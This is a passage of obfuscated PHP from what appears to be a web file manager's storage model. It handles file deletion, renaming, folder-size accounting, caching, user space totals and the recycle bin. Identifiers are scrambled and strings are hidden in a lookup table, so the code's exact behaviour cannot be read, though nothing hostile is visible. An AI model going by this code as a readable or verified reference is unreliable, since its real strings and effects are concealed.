$this->childrenAll($ÛØÚÀ”ñ); Model($ŸùÜ¯œ±[633])->eventRemove($‹¨á’öË); $this->removeRelevance($êıß†¥Ø[$ŸùÜ¯œ±[2284]], $êıß†¥Ø[$ŸùÜ¯œ±[1583]]); } $this->folderSizeReset($ÛØÚÀ”ñ[$ŸùÜ¯œ±[192]]); $­Ç£Ñ£À = array($ÛØÚÀ”ñ[$ŸùÜ¯œ±[192]]); if ($ÛØÚÀ”ñ[$ŸùÜ¯œ±[485]] == $ŸùÜ¯œ±[91]) { $­Ç£Ñ£À[] = $ÛØÚÀ”ñ[$ŸùÜ¯œ±[193]]; } $this->updateModifyTime($­Ç£Ñ£À); $this->lockMoveEnd($‹¨á’öË); Hook::trigger($ŸùÜ¯œ±[1823], $²Ô¤—§Ê, $ŒÓ¼á³ ); return !0; } public function childrenAll($Ô¡—€İ´) { $ß®ıø—¾ =& $_SERVER[²Ö÷öõ]; $úÈ€Óßê = $Ô¡—€İ´[$ß®ıø—¾[193]]; if ($Ô¡—€İ´[$ß®ıø—¾[485]] == $ß®ıø—¾[91]) { $·×µ™Íã = array($ß®ıø—¾[652] => array($ß®ıø—¾[612], $Ô¡—€İ´[$ß®ıø—¾[584]] . $úÈ€Óßê . $ß®ıø—¾[613])); $”å¼ Ì¸ = array($ß®ıø—¾[652] => $·×µ™Íã[$ß®ıø—¾[584]]); $’Šú¡ÎÆ = $this->field($ß®ıø—¾[2287])->where($”å¼ Ì¸)->select(); $ª½­ÄÛ = !1; $…–¯ìü = array($úÈ€Óßê); if ($’Šú¡ÎÆ) { $ª½­ÄÛ = array_to_keyvalue($’Šú¡ÎÆ, $ß®ıø—¾[12], $ß®ıø—¾[541]); $ª½­ÄÛ = array_remove_value($ª½­ÄÛ, $ß®ıø—¾[228]); $…–¯ìü = array_to_keyvalue($’Šú¡ÎÆ, $ß®ıø—¾[12], $ß®ıø—¾[193]); $…–¯ìü[] = $úÈ€Óßê; } } else { $ª½­ÄÛ = array($Ô¡—€İ´[$ß®ıø—¾[541]]); $…–¯ìü = array($úÈ€Óßê); } return array($ß®ıø—¾[2284] => $…–¯ìü, $ß®ıø—¾[1583] => $ª½­ÄÛ); } public function removeArray($ æğæ•“) { if (!$ æğæ•“) { return !0; } } public function removeRelevance($ã½Á’èë, $òúıÑÎ“) { $»íµ©‰ =& $_SERVER[²Ö÷öõ]; $ã½Á’èë = $ã½Á’èë ? $ã½Á’èë : array(); $òúıÑÎ“ = $òúıÑÎ“ ? $òúıÑÎ“ : array(); $ã½Á’èë = array_unique(array_filter($ã½Á’èë)); $òúıÑÎ“ = array_unique(array_filter($òúıÑÎ“)); if (!$ã½Á’èë) { return !1; } $í˜’ú× = array($»íµ©‰[491] => array($»íµ©‰[492], $ã½Á’èë)); Model($»íµ©‰[2285])->where($í˜’ú×)->delete(); Model($»íµ©‰[535])->where($í˜’ú×)->delete(); Model($»íµ©‰[2131])->where($í˜’ú×)->delete(); Model($»íµ©‰[633])->where($í˜’ú×)->delete(); Model($»íµ©‰[1959])->removeBySource($ã½Á’èë); Model($»íµ©‰[2266])->removeBySource($ã½Á’èë); $this->where($í˜’ú×)->delete(); Model($»íµ©‰[544])->remove($òúıÑÎ“); for ($ı÷ğ²ß» = 0; $ı÷ğ²ß» < count($ã½Á’èë); $ı÷ğ²ß»++) { $this->sourceCacheClear($ã½Á’èë[$ı÷ğ²ß»]); } } public function rename($áªôãÚó, $ıƒÅÁŞÓ) { $¨„ÛïÍì =& $_SERVER[²Ö÷öõ]; $¨‚÷°ˆ = $this->sourceInfo($áªôãÚó); if (!$¨‚÷°ˆ) { return !1; } $úúƒä€Ï = $this->fileNameExist($¨‚÷°ˆ[$¨„ÛïÍì[192]], $ıƒÅÁŞÓ); if ($úúƒä€Ï && $úúƒä€Ï != $áªôãÚó) { return !1; } $î±ÂŸ¬ä = array($¨„ÛïÍì[494] => $ıƒÅÁŞÓ, $¨„ÛïÍì[651] => USER_ID); if ($¨‚÷°ˆ[$¨„ÛïÍì[485]] != $¨„ÛïÍì[91]) { $î±ÂŸ¬ä[$¨„ÛïÍì[486]] = substr(get_path_ext($ıƒÅÁŞÓ), 0, 10); } Model($¨„ÛïÍì[633])->eventRename($áªôãÚó, $¨‚÷°ˆ[$¨„ÛïÍì[32]], $ıƒÅÁŞÓ); $this->sourceCacheClear($áªôãÚó); $this->setNamePinyin($áªôãÚó, $î±ÂŸ¬ä[$¨„ÛïÍì[32]], !1); $this->updateModifyTime($¨‚÷°ˆ[$¨„ÛïÍì[192]]); $è—ş¶á = $this->where(array($¨„ÛïÍì[491] => $áªôãÚó))->data($î±ÂŸ¬ä)->save(); $Ëé¶ıŠ£ = $¨„ÛïÍì[2274] . $¨‚÷°ˆ[$¨„ÛïÍì[192]]; if (isset(self::$cacheChildList[$Ëé¶ıŠ£])) { unset(self::$cacheChildList[$Ëé¶ıŠ£]); } return $è—ş¶á; } public function setNamePinyin($“Îùâ Æ, $Üğ‹Çğ±, $’Ù½¦ü = true) { $¯ÌÚá²ê =& $_SERVER[²Ö÷öõ]; $€Î¥€éÕ = Input::check($Üğ‹Çğ±, $¯ÌÚá²ê[655]); $ğåÈËñö = array($¯ÌÚá²ê[517] => KodSort::makeStr($Üğ‹Çğ±)); if ($€Î¥€éÕ) { $ğåÈËñö[$¯ÌÚá²ê[538]] = str_replace($¯ÌÚá²ê[53], $¯ÌÚá²ê[12], Pinyin::get($Üğ‹Çğ±)); $ğåÈËñö[$¯ÌÚá²ê[537]] = Pinyin::get($Üğ‹Çğ±, $¯ÌÚá²ê[656]); } if (!$’Ù½¦ü && !$€Î¥€éÕ) { $ğåÈËñö[$¯ÌÚá²ê[538]] = null; $ğåÈËñö[$¯ÌÚá²ê[537]] = null; } $this->metaSet($“Îùâ Æ, $ğåÈËñö); } public function getContent($“Æ—¡¹”) { $ˆ¯Î¨É =& $_SERVER[²Ö÷öõ]; $„œ†ÕÕú = $this->fileInfoGet($“Æ—¡¹”); if (!$„œ†ÕÕú) { return !1; } if ($„œ†ÕÕú[$ˆ¯Î¨É[79]] == 0) { return $ˆ¯Î¨É[12]; } $“É¥’“ä = $ˆ¯Î¨É[2288] . $„œ†ÕÕú[$ˆ¯Î¨É[547]]; if ($„œ†ÕÕú[$ˆ¯Î¨É[79]] <= 1024 * 10) { $ÊÍ±’Ã = Cache::get($“É¥’“ä); if (!$ÊÍ±’Ã) { $ÊÍ±’Ã = IO::getContent($„œ†ÕÕú[$ˆ¯Î¨É[87]]); Cache::set($“É¥’“ä, $ÊÍ±’Ã); } return $ÊÍ±’Ã; } if (!$„œ†ÕÕú[$ˆ¯Î¨É[87]]) { return $ˆ¯Î¨É[12]; } return IO::getContent($„œ†ÕÕú[$ˆ¯Î¨É[87]]); } public function setDesc($ìÇÔ¤üâ, $²‹ì—Â‹) { $™ü°Áº‘ =& $_SERVER[²Ö÷öõ]; Model($™ü°Áº‘[633])->eventAddDesc($ìÇÔ¤üâ, $²‹ì—Â‹); return $this->metaSet($ìÇÔ¤üâ, $™ü°Áº‘[526], $²‹ì—Â‹); } public function setContent($‹úâ²Õ, $ê£¿éö = '') { $ÔÑ‚‚üû =& $_SERVER[²Ö÷öõ]; $ê‘Œ—İ = $this->sourceInfo($‹úâ²Õ); $¬ÆÁÙÀù = $this->fileInfoGet($‹úâ²Õ); if (!$¬ÆÁÙÀù || !$ê‘Œ—İ) { return !1; } $¿¯ÛÊ¦ã = Model($ÔÑ‚‚üû[544])->addFileByContent($ê£¿éö, $ê‘Œ—İ[$ÔÑ‚‚üû[32]]); $¯§Ù¤½ = $this->fileHistory($ê‘Œ—İ, $¿¯ÛÊ¦ã[$ÔÑ‚‚üû[541]], $¿¯ÛÊ¦ã[$ÔÑ‚‚üû[79]]); if (!$¯§Ù¤½) { return Model($ÔÑ‚‚üû[544])->remove($¿¯ÛÊ¦ã[$ÔÑ‚‚üû[541]]); } $this->folderSizeReset($ê‘Œ—İ[$ÔÑ‚‚üû[192]]); return !0; } public function fileSubstr($¿­ÊĞ©¡, $‹Œ§£´û, $‘ÙÙÔ‡¹) { $ØçüÓãÁ = $this->fileInfoGet($¿­ÊĞ©¡); if (!$ØçüÓãÁ) { return !1; } return IO::fileSubstr($ØçüÓãÁ[$_SERVER[²Ö÷öõ][87]], $‹Œ§£´û, $‘ÙÙÔ‡¹); } public function fileInfoGet($è’‰¤ê¬) { $ÙƒœÌ€ó =& $_SERVER[²Ö÷öõ]; $‚€°ë°¯ = $this->sourceInfo($è’‰¤ê¬); if (!$‚€°ë°¯ || $‚€°ë°¯[$ÙƒœÌ€ó[485]]) { return !1; } $§Ø±ˆ£¨ = $ÙƒœÌ€ó[548] . $‚€°ë°¯[$ÙƒœÌ€ó[541]]; $˜¨ç“Ù‰ = _get(self::$cacheFileInfo, $§Ø±ˆ£¨); if ($˜¨ç“Ù‰) { return $˜¨ç“Ù‰; } $ÄñâÅå» = Model($ÙƒœÌ€ó[544])->fileInfo($‚€°ë°¯[$ÙƒœÌ€ó[541]]); if ($ÄñâÅå») { $ÄñâÅå»[$ÙƒœÌ€ó[32]] = $‚€°ë°¯[$ÙƒœÌ€ó[32]]; } self::$cacheFileInfo[$§Ø±ˆ£¨] = $ÄñâÅå»; return $ÄñâÅå»; } private function folderChildrenNumber($€€²šîÂ) { $³©¿Œ˜ =& $_SERVER[²Ö÷öõ]; $“ÑÉü‡Ò = $this->sourceInfo($€€²šîÂ); $ò•«Ú¡ = array($³©¿Œ˜[652] => array($³©¿Œ˜[612], $“ÑÉü‡Ò[$³©¿Œ˜[584]] . $€€²šîÂ . $³©¿Œ˜[613]), $³©¿Œ˜[649] => $“ÑÉü‡Ò[$³©¿Œ˜[569]], $³©¿Œ˜[504] => intval($“ÑÉü‡Ò[$³©¿Œ˜[505]]), $³©¿Œ˜[646] => 1); $Ëğ¨œ = $this->where($ò•«Ú¡)->count(); $°ä¢‰³• = $this->where($ò•«Ú¡)->where(array($³©¿Œ˜[646] => 0))->count(); return array($³©¿Œ˜[83] => $°ä¢‰³•, $³©¿Œ˜[84] => $Ëğ¨œ); } public function pathInfo($Æ÷Ú«‰Ô, $£Ÿœ£½— = false) { $íÍñßóò =& $_SERVER[²Ö÷öõ]; $£Ÿœ£½— = !1; $Æ÷Ú«‰Ô = intval($Æ÷Ú«‰Ô); $ÅÜéÃª³ = $íÍñßóò[534] . intval($£Ÿœ£½—) . $íÍñßóò[462] . $Æ÷Ú«‰Ô; $Ú©š¿Ú = _get(self::$cachePathInfo, $ÅÜéÃª³); if ($Ú©š¿Ú) { return $Ú©š¿Ú; } $¹ïŸÚ—‡ = $this->sourceInfo($Æ÷Ú«‰Ô); if (!$¹ïŸÚ—‡) { return !1; } $¹ïŸÚ—‡ = $this->_listDataApplyItem($¹ïŸÚ—‡, $£Ÿœ£½—); self::$cachePathInfo[$ÅÜéÃª³] = $¹ïŸÚ—‡; return $¹ïŸÚ—‡; } public static $cachePathInfoMore = array(); public function pathInfoMore($’ŒÀÀ·) { $¯Ñ¨‰ŠÈ =& $_SERVER[²Ö÷öõ]; $øÑ¸Ğóù = _get(self::$cachePathInfoMore, $’ŒÀÀ·); if ($øÑ¸Ğóù) { return $øÑ¸Ğóù; } $º–ÁÊñş = $this->pathInfo($’ŒÀÀ·); if (!$º–ÁÊñş) { return !1; } if ($º–ÁÊñş[$¯Ñ¨‰ŠÈ[485]] == $¯Ñ¨‰ŠÈ[91]) { $º–ÁÊñş[$¯Ñ¨‰ŠÈ[82]] = $this->folderChildrenNumber($’ŒÀÀ·); } self::$cachePathInfoMore[$’ŒÀÀ·] = $º–ÁÊñş; return $º–ÁÊñş; } public function sourceInfo($ùÛÃÎÅµ) { $¸á¤¬µ× =& $_SERVER[²Ö÷öõ]; if (!$ùÛÃÎÅµ) { return array(); } $ùÛÃÎÅµ = intval($ùÛÃÎÅµ); $—ÙÜ„¾å = $¸á¤¬µ×[533] . $ùÛÃÎÅµ; $—ê£ş³Ò = _get(self::$cacheSourceInfo, $—ÙÜ„¾å); if ($—ê£ş³Ò) { return $—ê£ş³Ò; } $ÄÀœ±Âõ = $this->where(array($¸á¤¬µ×[193] => $ùÛÃÎÅµ))->find(); self::$cacheSourceInfo[$—ÙÜ„¾å] = $ÄÀœ±Âõ; return self::$cacheSourceInfo[$—ÙÜ„¾å]; } public function sourceCacheClear($Ğ½–·ùô = false) { self::cacheClear($Ğ½–·ùô); } public static function cacheClear($¦ä¼ÇÈ = false) { $şã†‹£Ö =& $_SERVER[²Ö÷öõ]; if ($¦ä¼ÇÈ == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$şã†‹£Ö[533] . $¦ä¼ÇÈ]); unset(self::$cachePathInfoMore[$¦ä¼ÇÈ]); unset(self::$cachePathInfo[$şã†‹£Ö[2289] . $¦ä¼ÇÈ]); unset(self::$cachePathInfo[$şã†‹£Ö[2290] . $¦ä¼ÇÈ]); } public function metaSet($ô«€¬¬Ë, $¹Ó¢ÔÓË = null, $¡îŞ³Úë = null) { $ÍÎÊ¶æû = parent::metaSet($ô«€¬¬Ë, $¹Ó¢ÔÓË, $¡îŞ³Úë); if ($ÍÎÊ¶æû) { $this->sourceCacheClear($ô«€¬¬Ë); } return $ÍÎÊ¶æû; } public function pathInfoByPath($ÅĞÓ™‚ş, $Œùú™÷») { $³¥³·ëô =& $_SERVER[²Ö÷öõ]; $±»¢Ô·Á = !$Œùú™÷» ? array() : explode($³¥³·ëô[8], trim($Œùú™÷», $³¥³·ëô[8])); $ı óÉ Î = $ÅĞÓ™‚ş; foreach ($±»¢Ô·Á as $¾Ôúóæ¸) { $»âÛäªô = array($³¥³·ëô[192] => $ı óÉ Î, $³¥³·ëô[32] => $¾Ôúóæ¸); $ªà¶êŠß = $this->field($³¥³·ëô[2291])->where($»âÛäªô)->select(); if (!$ªà¶êŠß) { return !1; } $ªà¶êŠß = array_sort_by($ªà¶êŠß, $³¥³·ëô[505]); $ı óÉ Î = $ªà¶êŠß[0][$³¥³·ëô[193]]; } $Ïò“Ì”• = $this->sourceInfo($ı óÉ Î); $this->pathInfoFilter($Ïò“Ì”•); return $Ïò“Ì”•; } protected function updateModifyTime($•ÀâÈÑ˜) { $œäÙ™ˆ =& $_SERVER[²Ö÷öõ]; $¤ûÎ‘³ = defined($œäÙ™ˆ[2206]) ? USER_ID : 0; if (!$•ÀâÈÑ˜) { return; } if (!is_array($•ÀâÈÑ˜)) { $•ÀâÈÑ˜ = array($•ÀâÈÑ˜); } foreach ($•ÀâÈÑ˜ as $•˜ë‰’İ => $ö§²œÑ) { $•ÀâÈÑ˜[$•˜ë‰’İ] = intval($ö§²œÑ); $this->sourceCacheClear($ö§²œÑ); } $¯¥šÉ°‰ = array($œäÙ™ˆ[193] => array($œäÙ™ˆ[7], $•ÀâÈÑ˜)); $­¦…³¾á = array($œäÙ™ˆ[651] => $¤ûÎ‘³, $œäÙ™ˆ[498] => time()); $this->where($¯¥šÉ°‰)->save($­¦…³¾á); } public function folderSizeReset($ã™Å ®ş, $ëéœ’ô = false) { $Îğëğ¸í =& $_SERVER[²Ö÷öõ]; if ($this->statusIgnoreResetSpace) { return; } $×Î˜àõ¥ = $this->sourceInfo($ã™Å ®ş); $´†½”şÅ = $Îğëğ¸í[2292] . $ã™Å ®ş; CacheLock::lock($´†½”şÅ, 20); if ($ëéœ’ô === !1) { $this->sourceCacheClear($ã™Å ®ş); $×Î˜àõ¥ = $this->sourceInfo($ã™Å ®ş); $ì£¤ÌûŸ = array($Îğëğ¸í[477] => $ã™Å ®ş, $Îğëğ¸í[504] => 0); $ÎÓ‰‹°ı = $this->where($ì£¤ÌûŸ)->sum($Îğëğ¸í[79]); $ëéœ’ô = intval($ÎÓ‰‹°ı) - intval($×Î˜àõ¥[$Îğëğ¸í[79]]); } if ($ëéœ’ô == 0) { return CacheLock::unlock($´†½”şÅ); } $× ¯À“ı = $this->parentLevelArray($×Î˜àõ¥[$Îğëğ¸í[584]]); if (!$× ¯À“ı) { $× ¯À“ı = array(); } $× ¯À“ı[] = $×Î˜àõ¥[$Îğëğ¸í[193]]; $ì£¤ÌûŸ = array($Îğëğ¸í[193] => array($Îğëğ¸í[492], $× ¯À“ı)); if ($ëéœ’ô < 0) { $ì£¤ÌûŸ[$Îğëğ¸í[79]] = array($Îğëğ¸í[1101], abs($ëéœ’ô)); } $this->where($ì£¤ÌûŸ)->setAdd($Îğëğ¸í[79], $ëéœ’ô); CacheLock::unlock($´†½”şÅ); $Ì˜‹²‹è = $Îğëğ¸í[2293] . $×Î˜àõ¥[$Îğëğ¸í[190]] . $Îğëğ¸í[4] . $×Î˜àõ¥[$Îğëğ¸í[569]]; $ÃÒŞşáæ = array($×Î˜àõ¥[$Îğëğ¸í[190]], $×Î˜àõ¥[$Îğëğ¸í[569]]); TaskRun::timeLimitCall($Ì˜‹²‹è, $Îğëğ¸í[2294], $ÃÒŞşáæ, 1.5); } public function folderSizeResetChildren($ÂÜéÇÚ) { $÷ËÙóÕÆ =& $_SERVER[²Ö÷öõ]; $this->sourceCacheClear($ÂÜéÇÚ); $ä‚è¹ï› = $this->sourceInfo($ÂÜéÇÚ); $•¥±†¯ = array($÷ËÙóÕÆ[646] => 1, $÷ËÙóÕÆ[649] => $ä‚è¹ï›[$÷ËÙóÕÆ[569]], $÷ËÙóÕÆ[652] => array($÷ËÙóÕÆ[612], $ä‚è¹ï›[$÷ËÙóÕÆ[584]] . $ÂÜéÇÚ . $÷ËÙóÕÆ[613])); $€œäù¨• = $÷ËÙóÕÆ[2295]; $Ò©—ğÏ = $this->field($€œäù¨•)->where($•¥±†¯)->select(); $•¥±†¯[$÷ËÙóÕÆ[485]] = 0; $ö×¬‰Ò¤ = $this->field($€œäù¨•)->where($•¥±†¯)->select(); if (!$ö×¬‰Ò¤) { return; } $Ò©—ğÏ[] = $ä‚è¹ï›; $Ò©—ğÏ = array_to_keyvalue($Ò©—ğÏ, $÷ËÙóÕÆ[193]); foreach ($Ò©—ğÏ as $ëçİÕÉı => $ìØ ¿—¿) { $Ò©—ğÏ[$ëçİÕÉı][$÷ËÙóÕÆ[2296]] = $Ò©—ğÏ[$ëçİÕÉı][$÷ËÙóÕÆ[79]]; $Ò©—ğÏ[$ëçİÕÉı][$÷ËÙóÕÆ[79]] = 0; } foreach ($ö×¬‰Ò¤ as $ìØ ¿—¿) { $İïÔ¶ë = $ìØ ¿—¿[$÷ËÙóÕÆ[192]] . $÷ËÙóÕÆ[12]; if (!isset($Ò©—ğÏ[$İïÔ¶ë])) { continue; } if ($ìØ ¿—¿[$÷ËÙóÕÆ[505]] == $Ò©—ğÏ[$İïÔ¶ë][$÷ËÙóÕÆ[505]]) { $Ò©—ğÏ[$İïÔ¶ë][$÷ËÙóÕÆ[79]] += $ìØ ¿—¿[$÷ËÙóÕÆ[79]]; } } foreach ($Ò©—ğÏ as $ìØ ¿—¿) { $ıòÇ½ºÌ = $this->parentLevelArray($ìØ ¿—¿[$÷ËÙóÕÆ[584]]); foreach ($ıòÇ½ºÌ as $İïÔ¶ë) { $İïÔ¶ë = $İïÔ¶ë . $÷ËÙóÕÆ[12]; if (!isset($Ò©—ğÏ[$İïÔ¶ë])) { continue; } if ($ìØ ¿—¿[$÷ËÙóÕÆ[505]] == $Ò©—ğÏ[$İïÔ¶ë][$÷ËÙóÕÆ[505]]) { $Ò©—ğÏ[$İïÔ¶ë][$÷ËÙóÕÆ[79]] += $ìØ ¿—¿[$÷ËÙóÕÆ[79]]; } } } $çŒà‰Ô = array(); foreach ($Ò©—ğÏ as $ìØ ¿—¿) { if ($ìØ ¿—¿[$÷ËÙóÕÆ[79]] == $ìØ ¿—¿[$÷ËÙóÕÆ[2296]]) { continue; } $çŒà‰Ô[] = array($÷ËÙóÕÆ[193], $ìØ ¿—¿[$÷ËÙóÕÆ[193]], $÷ËÙóÕÆ[79], $ìØ ¿—¿[$÷ËÙóÕÆ[79]]); } $this->saveAll($çŒà‰Ô); } public function userSpaceReset($’ëÙ‡‚ = false) { $æÓìÓè¨ =& $_SERVER[²Ö÷öõ]; $½ŠÇÄ = $this->where(array($æÓìÓè¨[190] => self::TYPE_USER, $æÓìÓè¨[569] => $’ëÙ‡‚, $æÓìÓè¨[485] => 0))->sum($æÓìÓè¨[79]); $½ŠÇÄ = !$½ŠÇÄ || $½ŠÇÄ <= 0 ? 0 : $½ŠÇÄ; Model($æÓìÓè¨[577])->userEdit($’ëÙ‡‚, array($æÓìÓè¨[1968] => $½ŠÇÄ)); } public function targetSpaceUpdate($õ¾µÄ·, $™æºâáè) { $ìéõ×§¼ =& $_SERVER[²Ö÷öõ]; if (!$™æºâáè) { return; } if (!in_array($õ¾µÄ·, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $¦ê­²ä = $this->targetSpaceSize($õ¾µÄ·, $™æºâáè); if ($õ¾µÄ· == self::TYPE_USER) { Model($ìéõ×§¼[577])->userEdit($™æºâáè, array($ìéõ×§¼[1968] => $¦ê­²ä)); } else { if ($õ¾µÄ· == self::TYPE_GROUP) { Model($ìéõ×§¼[585])->groupEdit($™æºâáè, array($ìéõ×§¼[1968] => $¦ê­²ä)); } } } public function targetSpaceSize($æ£—¸³°, $Èîù¹ğ) { $´²ö‹½¥ =& $_SERVER[²Ö÷öõ]; $ö˜™˜ñš = 0; $µşÈøè = $this->targetSourceRoot($æ£—¸³°, $Èîù¹ğ, !0); foreach ($µşÈøè as $îÜ¾ôˆ) { if (!$îÜ¾ôˆ) { continue; } $ö˜™˜ñš += floatval($îÜ¾ôˆ[$´²ö‹½¥[79]]); $ÂÏºßÜ® = array($´²ö‹½¥[652] => array($´²ö‹½¥[612], $´²ö‹½¥[594] . $îÜ¾ôˆ[$´²ö‹½¥[193]] . $´²ö‹½¥[613])); $íÃ¹ãÉ» = Model($´²ö‹½¥[503])->field($´²ö‹½¥[491])->where($ÂÏºßÜ®)->select(); $íÃ¹ãÉ» = array_to_keyvalue($íÃ¹ãÉ», $´²ö‹½¥[12], $´²ö‹½¥[193]); $íÃ¹ãÉ» = array_unique(array_filter($íÃ¹ãÉ»)); if ($íÃ¹ãÉ») { $ÂÏºßÜ® = array($´²ö‹½¥[491] => array($´²ö‹½¥[492], $íÃ¹ãÉ»)); $ö˜™˜ñš += floatval($this->where($ÂÏºßÜ®)->sum($´²ö‹½¥[79])); } } $ö˜™˜ñš = !$ö˜™˜ñš || $ö˜™˜ñš <= 0 ? 0 : $ö˜™˜ñš; return $ö˜™˜ñš; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($¼Šù™“¸) { return $this->fileTypeProfile($¼Šù™“¸, SourceModel::TYPE_USER); } public function groupFileTypeProfile($üœàŒ“´) { return $this->fileTypeProfile($üœàŒ“´, SourceModel::TYPE_GROUP); } private function fileTypeProfile($¸¢³ù¶à, $Ü«Œçî) { $Ï›Àìû =& $_SERVER[²Ö÷öõ]; $º§§ÓÍÈ = $Ï›Àìû[2297] . $¸¢³ù¶à . $Ï›Àìû[11] . $Ü«Œçî; $ôë˜‚ = Cache::get($º§§ÓÍÈ); if ($ôë˜‚) { return $ôë˜‚; } $ÌÏàÊœ = array($Ï›Àìû[646] => 0); if ($¸¢³ù¶à != !1) { $ÌÏàÊœ[$Ï›Àìû[569]] = $¸¢³ù¶à; $ÌÏàÊœ[$Ï›Àìû[190]] = $Ü«Œçî; } $·¾âğ = array(); $·¾âğ[$Ï›Àìû[2298]] = array($Ï›Àìû[2299] => LNG($Ï›Àìû[2298]), $Ï›Àìû[2300] => $this->where($ÌÏàÊœ)->count(), $Ï›Àìû[617] => $this->where($ÌÏàÊœ)->sum($Ï›Àìû[79])); $“ æÏú = KodIO::fileTypeList(); foreach ($“ æÏú as $¶œ¬ÔÉÛ => $¸şëı½) { $ÌÏàÊœ[$Ï›Àìû[486]] = $this->fileTypeWhere($¶œ¬ÔÉÛ); $·¾âğ[$¶œ¬ÔÉÛ] = array($Ï›Àìû[2299] => $¸şëı½[$Ï›Àìû[32]], $Ï›Àìû[2300] => $this->where($ÌÏàÊœ)->count(), $Ï›Àìû[617] => $this->where($ÌÏàÊœ)->sum($Ï›Àìû[79])); } Cache::set($º§§ÓÍÈ, $·¾âğ, 1200); return $·¾âğ; } public function fileNameExist($Á¨ºÙï¿, $½ßŞ„š±) { $µåµÏİ¸ =& $_SERVER[²Ö÷öõ]; $¸÷„Œ÷‰ = $this->field($µåµÏİ¸[2301])->where(array($µåµÏİ¸[192] => $Á¨ºÙï¿, $µåµÏİ¸[32] => $½ßŞ„š±, $µåµÏİ¸[505] => 0))->find(); return is_array($¸÷„Œ÷‰) ? $¸÷„Œ÷‰[$µåµÏİ¸[193]] : !1; } public function childList($†ôÂÊÎ—) { $ºÖ³ÊŒ =& $_SERVER[²Ö÷öõ]; $®‹êÙ™è = $ºÖ³ÊŒ[2274] . $†ôÂÊÎ—; if (isset(self::$cacheChildList[$®‹êÙ™è])) { return self::$cacheChildList[$®‹êÙ™è]; } $ÌŸÛËÅª = array($ºÖ³ÊŒ[192] => intval($†ôÂÊÎ—), $ºÖ³ÊŒ[505] => 0); $¿ Ø©¦¦ = $this->where($ÌŸÛËÅª)->select(); $¿ Ø©¦¦ = $¿ Ø©¦¦ ? $¿ Ø©¦¦ : array(); self::$cacheChildList[$®‹êÙ™è] = $¿ Ø©¦¦; foreach ($¿ Ø©¦¦ as $Í´àğ‰Æ) { $®‹êÙ™è = $ºÖ³ÊŒ[533] . $Í´àğ‰Æ[$ºÖ³ÊŒ[193]]; self::$cacheSourceInfo[$®‹êÙ™è] = $Í´àğ‰Æ; } return $¿ Ø©¦¦; } public function fileNameAuto($¹Í×¿¡Ë, $åÅ¦ûÙè, $•°ÖÁœğ = REPEAT_RENAME, $ÈÃñ¹¡ª = false) { $¬‹ª†À­ =& $_SERVER[²Ö÷öõ]; $Ş×ª¨è = get_path_ext($åÅ¦ûÙè); $ˆÓàáó¯ = $Ş×ª¨è ? get_path_ext_name($åÅ¦ûÙè) . $¬‹ª†À­[2302] . $Ş×ª¨è : $åÅ¦ûÙè . $¬‹ª†À­[460]; $ĞÊœàÖ = array($¬‹ª†À­[192] => $¹Í×¿¡Ë, $¬‹ª†À­[505] => 0, $¬‹ª†À­[32] => array($¬‹ª†À­[459], $ˆÓàáó¯)); $‘ÍÜÄû = $this->field($¬‹ª†À­[32])->where($ĞÊœàÖ)->select(); $“¶üÄ¥Ã = array_to_keyvalue($‘ÍÜÄû, $¬‹ª†À­[12], $¬‹ª†À­[32]); return $this->fileNameAutoGet($“¶üÄ¥Ã, $åÅ¦ûÙè, $•°ÖÁœğ, $ÈÃñ¹¡ª); } public function fileNameAutoGet($®ã£¿—Î, $¿¾Õò‰Š, $¡ÜÜÙÕ¿, $Á˜´Ñ¥ä) { $€¡¦Ë«Ë =& $_SERVER[²Ö÷öõ]; if ($¡ÜÜÙÕ¿ == REPEAT_REPLACE || !$®ã£¿—Î || !in_array_not_case($¿¾Õò‰Š, $®ã£¿—Î) || $Á˜´Ñ¥ä && $¡ÜÜÙÕ¿ != REPEAT_RENAME_FOLDER) { return $¿¾Õò‰Š; } if ($¡ÜÜÙÕ¿ == REPEAT_SKIP) { return !1; } $¥şßó‚â = $€¡¦Ë«Ë[10] . get_path_ext($¿¾Õò‰Š); $¥şßó‚â = $¥şßó‚â == $€¡¦Ë«Ë[10] || $Á˜´Ñ¥ä ? $€¡¦Ë«Ë[12] : $¥şßó‚â; for ($Í§§ƒ = 1; $Í§§ƒ <= count($®ã£¿—Î) + 1; $Í§§ƒ++) { $Ö§¦‚ñú = substr($¿¾Õò‰Š, 0, strlen($¿¾Õò‰Š) - strlen($¥şßó‚â)); $ˆÙÚ©Šû = $Ö§¦‚ñú . "\x28{$Í§§ƒ}\x29{$¥şßó‚â}"; if (!in_array_not_case($ˆÙÚ©Šû, $®ã£¿—Î)) { return $ˆÙÚ©Šû; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\151\x6f\137\163\157\x75\x72\x63\145\x5f\x72\145\143\171\143\154\145"; protected $dataAuto = array(array("\143\162\145\x61\164\145\124\151\155\x65", "\164\x69\155\x65", "\151\156\163\145\x72\x74", "\146\x75\x6e\143\164\x69\157\x6e")); public function listData($ØôèûÆ¢ = false) { $Âù­ÄíÃ =& $_SERVER[²Ö÷öõ]; $ØôèûÆ¢ = $ØôèûÆ¢ ? $ØôèûÆ¢ : USER_ID; $àíÚšºÈ = $this->where(array($Âù­ÄíÃ[1771] => $ØôèûÆ¢))->select(); return array_to_keyvalue($àíÚšºÈ, $Âù­ÄíÃ[12], $Âù­ÄíÃ[193]); } public function moveToRecycle($ÃÕÖƒˆí) { $Ì¡«üŠ” =& $_SERVER[²Ö÷öõ]; $Ç³Íš¢á = Model($Ì¡«üŠ”[1428]); $óŒ·Ââñ = $Ç³Íš¢á->sourceInfo($ÃÕÖƒˆí); if (!$óŒ·Ââñ || $óŒ·Ââñ[$Ì¡«üŠ”[505]] == $Ì¡«üŠ”[91]) { return; } $şèõŒî = array($Ì¡«üŠ”[491] => $ÃÕÖƒˆí, $Ì¡«üŠ”[1771] => USER_ID, $Ì¡«üŠ”[648] => $óŒ·Ââñ[$Ì¡«üŠ”[190]], $Ì¡«üŠ”[649] => $óŒ·Ââñ[$Ì¡«üŠ”[569]], $Ì¡«üŠ”[652] => $óŒ·Ââñ[$Ì¡«üŠ”[584]]); $this->add($şèõŒî); $this->recycleMove($ÃÕÖƒˆí, 1); if ($óŒ·Ââñ[$Ì¡«üŠ”[485]] == $Ì¡«üŠ”[91]) { 